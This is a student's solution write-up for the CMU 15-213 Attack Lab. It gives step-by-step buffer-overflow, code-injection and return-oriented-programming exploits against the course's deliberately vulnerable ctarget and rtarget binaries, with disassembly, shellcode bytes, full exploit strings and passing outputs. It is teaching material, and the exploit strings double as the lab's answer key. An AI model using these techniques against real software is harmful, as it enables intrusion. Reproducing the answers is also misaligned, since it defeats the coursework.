
- [Lab 2: Attack Lab](#lab-2--attack-lab)
  * [**Problem Description**](#--problem-description--)
  * [Part 1. *ctarget*](#part-1--ctarget-)
  * [ctarget Level 1: goal](#ctarget-level-1--goal)
  * [ctarget Level 1: Solution](#ctarget-level-1--solution)
    + [Step 1. Disassemble the ctarget](#step-1-disassemble-the-ctarget)
    + [Step 2. Inspect the stack frame of *getbuf*](#step-2-inspect-the-stack-frame-of--getbuf-)
    + [Step 3. Attack the return address](#step-3-attack-the-return-address)
  * [ctarget Level 2: Goal](#ctarget-level-2--goal)
  * [ctarget Level 2: Solution](#ctarget-level-2--solution)
    + [Step 1. Inspect the stack](#step-1-inspect-the-stack)
    + [Step 2. Make a code](#step-2-make-a-code)
    + [Step 3. Verify](#step-3-verify)
  * [ctarget Level 3: Goal](#ctarget-level-3--goal)
  * [ctarget Level 3: Solution](#ctarget-level-3--solution)
    + [Step 1. Inspect the assembly code](#step-1-inspect-the-assembly-code)
    + [Step 2. Find the address to put string](#step-2-find-the-address-to-put-string)
    + [Step 3. Make a code](#step-3-make-a-code)
  * [rtarget Level 2: Goal](#rtarget-level-2--goal)
  * [rtarget Level 2: Solution](#rtarget-level-2--solution)
    + [Step 1. Inspect the disassembly](#step-1-inspect-the-disassembly)
    + [Step 2. Arrange the stack](#step-2-arrange-the-stack)

# Lab 2: Attack Lab

> *Covered Concept: Stack Frame, Buffer Overflow, Return Oriented Programming*  

## **Problem Description**

> Two programs, *ctarget* and *rtarget*, are provided. Both program has vulnerabilities of buffer overflow. Make use of the vulnerabilities to achieve the specific goals. Each files has 3 level of challenge. Let's get started.  
> More details in the ***attacklab.pdf***


## Part 1. *ctarget*
---
## ctarget Level 1: goal

Function getbuf is called within CTARGET by a function test having the following C code:
```C
1 void test()
2 {
3     int val;
4     val = getbuf();
5     printf("No exploit. Getbuf returned 0x%x\n", val);
6 }
```
When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution
within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget,
there is code for a function touch1 having the following C representation:
```C
1 void touch1()
2 {
3     vlevel = 1; /* Part of validation protocol */
4     printf("Touch1!: You called touch1()\n");
5     validate(1);
6     exit(0);
7 }
```
Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement,
rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly
related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.

---
## ctarget Level 1: Solution

Strategy
>We could make the buffer overflow to change the return address on the stack frame of ***getbuf*** so that the return address is pointed to ***touch1()***  

### Step 1. Disassemble the ctarget
```shell=
 objdump -d ctarget > ctarget.asm
```
Let's see the ***getbuf***
```
    00000000004017a8 <getbuf>:
      4017a8:	48 83 ec 28          	sub    $0x28,%rsp
      4017ac:	48 89 e7             	mov    %rsp,%rdi
      4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
      4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
      4017b9:	48 83 c4 28          	add    $0x28,%rsp
      4017bd:	c3                   	ret    
      4017be:	90                   	nop
      4017bf:	90                   	nop
```  
1. Allocate 0x28 bytes on the stack  
2. The result of \<Gets\> is put on the stack.

```
    00000000004017c0 <touch1>:
      4017c0:	48 83 ec 08          	sub    $0x8,%rsp
      4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
      4017cb:	00 00 00 
      4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
      4017d3:	e8 e8 f4 ff ff       	call   400cc0 <puts@plt>
      4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
      4017dd:	e8 ab 04 00 00       	call   401c8d <validate>
      4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
      4017e7:	e8 54 f6 ff ff       	call   400e40 <exit@plt>
```
1. The address of *\<touch1\>* is `0x4017c0` 

### Step 2. Inspect the stack frame of *getbuf*

```
     gdb ctarget  # debug the ctarget
     b getbuf     # set a breakpoint at getbuf
     run -q -i ansC.txt  # run the ctarget with ansC.txt as input
     info frame   # inspect the stack frame of getbuf
``` 

Result:  


>(gdb) info frame
Stack level 0, frame at 0x5561dca8:
 rip = 0x4017a8 in getbuf (buf.c:12); saved rip = 0x401976
 called by frame at 0x5561dcb8
 source language c.
 Arglist at 0x5561dc98, args: 
 Locals at 0x5561dc98, Previous frame's sp is 0x5561dca8
 Saved registers:
  rip at 0x5561dca0

   &rArr; saved rip = 0x401976  

Let's see the <test> in the **ctarget.asm** 
The saved rip points to the instruction right after calling     ***getbuf*** in the ***test***  
```=
    0000000000401968 <test>:
      401968:	48 83 ec 08          	sub    $0x8,%rsp
      40196c:	b8 00 00 00 00       	mov    $0x0,%eax
      401971:	e8 32 fe ff ff       	call   4017a8 <getbuf>
      401976:	89 c2                	mov    %eax,%edx
      401978:	be 88 31 40 00       	mov    $0x403188,%esi
      40197d:	bf 01 00 00 00       	mov    $0x1,%edi
      401982:	b8 00 00 00 00       	mov    $0x0,%eax
      401987:	e8 64 f4 ff ff       	call   400df0 <__printf_chk@plt>
      40198c:	48 83 c4 08          	add    $0x8,%rsp
      401990:	c3                   	ret    
      401991:	90                   	nop
```  

rip at 0x5561dca0 &rArr; where the return address is stored 

### Step 3. Attack the return address

The getbuf has allcoate 0x28 bytes on the stack.
&rArr; We should make 0x28 (40) dummy bytes on the stack.  
&rArr; After 0x28 bytes, the buffer overflowed and input has reached the return address of ***getbuf***.  

Since the address of ***touch1*** is `0x4017c0`  
&rArr; The answer would be:  
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40
```  
Since the machine is little endian, reverse the byte order of address. 

```shell=
./hex2raw -i ansC_lv1.txt > ansC_lv1_raw.txt
./ctarget -q -i ansC_lv1_raw.txt
```

>Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 

---

## ctarget Level 2: Goal

Phase 2 involves injecting a small amount of code as part of your exploit string.
Within the file ctarget there is code for a function touch2 having the following C representation:
```C
1 void touch2(unsigned val)
6
2 {
3     vlevel = 2; /* Part of validation protocol */
4     if (val == cookie) {
5         printf("Touch2!: You called touch2(0x%.8x)\n", val);
6         validate(2);
7     } else {
8         printf("Misfire: You called touch2(0x%.8x)\n", val);
9         fail(2);
10    }
11    exit(0);
12 }
```

Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument. Some Advice:  
• You will want to position a byte representation of the address of your injected code in such a way that
ret instruction at the end of the code for getbuf will transfer control to it.
• Recall that the first argument to a function is passed in register %rdi.
• Your injected code should set the register to your cookie, and then use a ret instruction to transfer
control to the first instruction in touch2.
• Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination
addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of
control, even when you are not returning from a call.
• See the discussion in Appendix B on how to use tools to generate the byte-level representations of instruction sequences.  
    
---
## ctarget Level 2: Solution

### Step 1. Inspect the stack
Up to now, the stack is as shown:  
    ![](https://i.imgur.com/mHK12AP.png)
    
Our target is to pass cookie number as an argument and transfer control to **touch2**  

&rArr; We should make a code to achieve it.  
  
**Strategy**
    Make a code in the stack through exploit string to pass cookie number as argument and ret to **touch2**
  
### Step 2. Make a code

1. We should transfer the control to our code in the stack.
    &rArr; The return address should point to the entry of our code.

2. After transfer, the stack has popped the return address. Since we are going to transfer the control to **touch2**, we should push the address of **touch2** on the stack so that the next `ret` will jump to **touch2**. 

3. Pass the cookie as argument and ret.  

As a result of 2, 3: 
    
```=
#exploit code for ctarget level 2	
pushq $0x4017ec  # push the addr of touch2
movq $0x59b997fa, %rdi   # pass cookie as argument
ret   # return to the pushed return address
```

To get the form in bytes,
```=
gcc -c ansC_lv2_code.s
objdump -d ansC_lv2_code.o > ansC_lv2_code.s
```
We get the disassembly 
```=
    ./ansC_lv2.o      檔案格式 elf64-x86-64


.text 區段的反組譯：

0000000000000000 <.text>:
   0:	68 ec 17 40 00       	push   $0x4017ec
   5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   c:	c3                   	ret    
```

&rArr; Since the raw code contains 13 bytes, the entry of the code is 0x5561dca0 - 13 = `0x5561dc93`. We should make the return address this number.  

Consequently we make a input as below (in ansC_lv2.txt):
```=
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00
68 ec 17 40 00
48 c7 c7 fa 97 b9 59
c3
93 dc 61 55 00 00 00 00
```

### Step 3. Verify

```shell=
./hex2raw -i ansC_lv2.txt > ansC_lv2_raw.txt
./ctarget -q -i ansC_lv2_raw.txt
```  
Result:
```=
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 68 EC 17 40 00 48 C7 C7 FA 97 B9 59 C3 93 DC 61 55 00 00 00 00
```

## ctarget Level 3: Goal
Phase 3 also involves a code injection attack, but passing a string as argument.
Within the file ctarget there is code for functions hexmatch and touch3 having the following C
representations:
```C
1 /* Compare string to hex represention of unsigned value */
2 int hexmatch(unsigned val, char *sval)
3 {
4     char cbuf[110];
5     /* Make position of check string unpredictable */
6     char *s = cbuf + random() % 100;
7     sprintf(s, "%.8x", val);
8     return strncmp(sval, s, 9) == 0;
9 }
10
11 void touch3(char *sval)
12 {
13     vlevel = 3; /* Part of validation protocol */
14     if (hexmatch(cookie, sval)) {
15         printf("Touch3!: You called touch3(\"%s\")\n", sval);
16         validate(3);
17     } else {
18         printf("Misfire: You called touch3(\"%s\")\n", sval);
19         fail(3);
20     }
21     exit(0);
22 }
```
Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must
make it appear to touch3 as if you have passed a string representation of your cookie as its argument.
Some Advice:
• You will need to include a string representation of your cookie in your exploit string. The string should
consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”
• Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type
“man ascii” on any Linux machine to see the byte representations of the characters you need.
• Your injected code should set register %rdi to the address of this string.
• When functions hexmatch and strncmp are called, they push data onto the stack, overwriting
portions of memory that held the buffer used by getbuf. As a result, you will need to be careful
where you place the string representation of your cookie.

## ctarget Level 3: Solution

**Strategy**
1. We should transfer the control to our code in the stack.
    &rArr; The return address should point to the entry of our code.

2. After transfer, the stack has popped the return address. Since we are going to transfer the control to **touch3**, we should push the address of **touch3** on the stack so that the next `ret` will jump to **touch3**. 

3. Pass the the string of cookie as argument and ret. 

### Step 1. Inspect the assembly code
```
00000000004018fa <touch3>:
  4018fa:	53                   	push   %rbx
  4018fb:	48 89 fb             	mov    %rdi,%rbx
  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:	00 00 00 
  401908:	48 89 fe             	mov    %rdi,%rsi
  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911:	e8 36 ff ff ff       	call   40184c <hexmatch>
  401916:	85 c0                	test   %eax,%eax
  401918:	74 23                	je     40193d <touch3+0x43>
  40191a:	48 89 da             	mov    %rbx,%rdx
  40191d:	be 38 31 40 00       	mov    $0x403138,%esi
  401922:	bf 01 00 00 00       	mov    $0x1,%edi
  401927:	b8 00 00 00 00       	mov    $0x0,%eax
  40192c:	e8 bf f4 ff ff       	call   400df0 <__printf_chk@plt>
  401931:	bf 03 00 00 00       	mov    $0x3,%edi
  401936:	e8 52 03 00 00       	call   401c8d <validate>
  40193b:	eb 21                	jmp    40195e <touch3+0x64>
  40193d:	48 89 da             	mov    %rbx,%rdx
  401940:	be 60 31 40 00       	mov    $0x403160,%esi
  401945:	bf 01 00 00 00       	mov    $0x1,%edi
  40194a:	b8 00 00 00 00       	mov    $0x0,%eax
  40194f:	e8 9c f4 ff ff       	call   400df0 <__printf_chk@plt>
  401954:	bf 03 00 00 00       	mov    $0x3,%edi
  401959:	e8 f1 03 00 00       	call   401d4f <fail>
  40195e:	bf 00 00 00 00       	mov    $0x0,%edi
  401963:	e8 d8 f4 ff ff       	call   400e40 <exit@plt>
```
```
000000000040184c <hexmatch>:
  40184c:	41 54                	push   %r12
  40184e:	55                   	push   %rbp
  40184f:	53                   	push   %rbx
  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  401854:	41 89 fc             	mov    %edi,%r12d
  401857:	48 89 f5             	mov    %rsi,%rbp
  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401861:	00 00 
  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  401868:	31 c0                	xor    %eax,%eax
  40186a:	e8 41 f5 ff ff       	call   400db0 <random@plt>
  40186f:	48 89 c1             	mov    %rax,%rcx
  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
  401879:	0a d7 a3 
  40187c:	48 f7 ea             	imul   %rdx
  40187f:	48 01 ca             	add    %rcx,%rdx
  401882:	48 c1 fa 06          	sar    $0x6,%rdx
  401886:	48 89 c8             	mov    %rcx,%rax
  401889:	48 c1 f8 3f          	sar    $0x3f,%rax
  40188d:	48 29 c2             	sub    %rax,%rdx
  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  401898:	48 c1 e0 02          	shl    $0x2,%rax
  40189c:	48 29 c1             	sub    %rax,%rcx
  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx
  4018a3:	45 89 e0             	mov    %r12d,%r8d
  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx
  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  4018b2:	be 01 00 00 00       	mov    $0x1,%esi
  4018b7:	48 89 df             	mov    %rbx,%rdi
  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax
  4018bf:	e8 ac f5 ff ff       	call   400e70 <__sprintf_chk@plt>
  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx
  4018c9:	48 89 de             	mov    %rbx,%rsi
  4018cc:	48 89 ef             	mov    %rbp,%rdi
  4018cf:	e8 cc f3 ff ff       	call   400ca0 <strncmp@plt>
  4018d4:	85 c0                	test   %eax,%eax
  4018d6:	0f 94 c0             	sete   %al
  4018d9:	0f b6 c0             	movzbl %al,%eax
  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
  4018e8:	00 00 
  4018ea:	74 05                	je     4018f1 <hexmatch+0xa5>
  4018ec:	e8 ef f3 ff ff       	call   400ce0 <__stack_chk_fail@plt>
  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
  4018f5:	5b                   	pop    %rbx
  4018f6:	5d                   	pop    %rbp
  4018f7:	41 5c                	pop    %r12
  4018f9:	c3                   	ret    
```
Both touch3 and hexmatch has pushed data on the stack.  
&rArr; touch3: 1 * 8 bytes  
&rArr; hexmatch: 3*8 bytes + 1 * 8 bytes (Canary)  

### Step 2. Find the address to put string 

We can use the same method as Level 2 to transfer control to touch3. The problem is where to put our input string as argument of touch3. We can imagine the content of stack after we transfer control to the touch3 as below.
    ![](https://i.imgur.com/LOe0X8O.png)

Remember that the input buffer we could control is start from address 0x5561dca0 - 0x28 = 0x5561dc78.

&rArr; We can put argument at address 0x5561dca8.  

The input targt is the string form of cookie which is 59b997fa. Convert it to ascii code is :  
    `35 39 62 39 39 37 66 61`  


### Step 3. Make a code

Similar to the level 2, we make a code as below.
```=
 #exploit code for ctarget level 3	
	pushq $0x4018fa  # push the addr of touch3
	movq $0x5561dca8, %rdi   # pass cookie string as argument
	ret   # return to the pushed return address  
```  

The dissassembly is as shown below:
```=
ansC_lv3_code.o      檔案格式 elf64-x86-64


.text 區段的反組譯：

0000000000000000 <.text>:
   0:	68 fa 18 40 00       	push   $0x4018fa
   5:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   c:	c3                   	ret    
```  

Integrate it into string buffer:
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00
68 fa 18 40 00
48 c7 c7 a8 dc 61 55
c3
93 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

After input, we get result shown below which is correct:
    
```
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 68 FA 18 40 00 48 C7 C7 A8 DC 61 55 C3 93 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61
```  

## rtarget Level 2: Goal

For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your
gadget farm. You can construct your solution using gadgets consisting of the following instruction types,
and using only the first eight x86-64 registers (%rax–%rdi).
movq : The codes for these are shown in Figure 3A.
popq : The codes for these are shown in Figure 3B.
ret : This instruction is encoded by the single byte 0xc3.
nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single
byte 0x90. Its only effect is to cause the program counter to be incremented by 1.
Some Advice:
• All the gadgets you need can be found in the region of the code for rtarget demarcated by the
functions start_farm and mid_farm.
• You can do this attack with just two gadgets.
• When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit
string will contain a combination of gadget addresses and data.  

## rtarget Level 2: Solution

In this level, we attack the rtarget with ROP. We could access the gadget from **<start_farm>** to **<end_farm>** in the rtarget.asm.
The farm is shown below:
```
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	ret    

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	ret    

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret    

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	ret    

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	ret    

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	ret    

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	ret    

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	ret    

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	ret    

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	ret    

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	ret    

00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	ret    

00000000004019e1 <setval_296>:
  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)
  4019e7:	c3                   	ret    

00000000004019e8 <addval_113>:
  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
  4019ee:	c3                   	ret    

00000000004019ef <addval_490>:
  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax
  4019f5:	c3                   	ret    

00000000004019f6 <getval_226>:
  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
  4019fb:	c3                   	ret    

00000000004019fc <setval_384>:
  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)
  401a02:	c3                   	ret    

0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	ret    

0000000000401a0a <setval_276>:
  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)
  401a10:	c3                   	ret    

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	ret    

0000000000401a18 <getval_345>:
  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  401a1d:	c3                   	ret    

0000000000401a1e <addval_479>:
  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
  401a24:	c3                   	ret    

0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	ret    

0000000000401a2c <setval_248>:
  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)
  401a32:	c3                   	ret    

0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	ret    

0000000000401a39 <addval_110>:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	ret    

0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	ret    

0000000000401a47 <addval_201>:
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	ret    

0000000000401a4e <getval_272>:
  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax
  401a53:	c3                   	ret    

0000000000401a54 <getval_155>:
  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax
  401a59:	c3                   	ret    

0000000000401a5a <setval_299>:
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	ret    

0000000000401a61 <addval_404>:
  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
  401a67:	c3                   	ret    

0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	ret    

0000000000401a6e <setval_167>:
  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
  401a74:	c3                   	ret    

0000000000401a75 <setval_328>:
  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)
  401a7b:	c3                   	ret    

0000000000401a7c <setval_450>:
  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)
  401a82:	c3                   	ret    

0000000000401a83 <addval_358>:
  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
  401a89:	c3                   	ret    

0000000000401a8a <addval_124>:
  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
  401a90:	c3                   	ret    

0000000000401a91 <getval_169>:
  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax
  401a96:	c3                   	ret    

0000000000401a97 <setval_181>:
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	ret    

0000000000401a9e <addval_184>:
  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
  401aa4:	c3                   	ret    

0000000000401aa5 <getval_472>:
  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax
  401aaa:	c3                   	ret    

0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	ret    

0000000000401ab2 <end_farm>:
  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax
  401ab7:	c3                   	ret    
  401ab8:	90                   	nop
  401ab9:	90                   	nop
  401aba:	90                   	nop
  401abb:	90                   	nop
  401abc:	90                   	nop
  401abd:	90                   	nop
  401abe:	90                   	nop
  401abf:	90                   	nop
```  

### Step 1. Inspect the disassembly

We will have to pass the cookie number as argument to **<touch2>** 
We could simply use `pop %rdi; ret` with cookie number on the stack to achieve this goal. Unfortunately, there is no such gadget in the farm. Therefore, we should take a detour as below.

```=
;Gadget 1
; pop the cookie number to %rax
pop %rax; ret;

;Gadget 2
; move the cookie number to %rdi as input argument to touch2
mov %rax, %rdi; ret;
```
### Step 2. Arrange the stack

To achieve the strategy above, we should arrange the stack as below:  
    
![](https://i.imgur.com/nZmhggd.png)

Which correspond to the input buffer:
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

After input, we get the result:
```
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```  


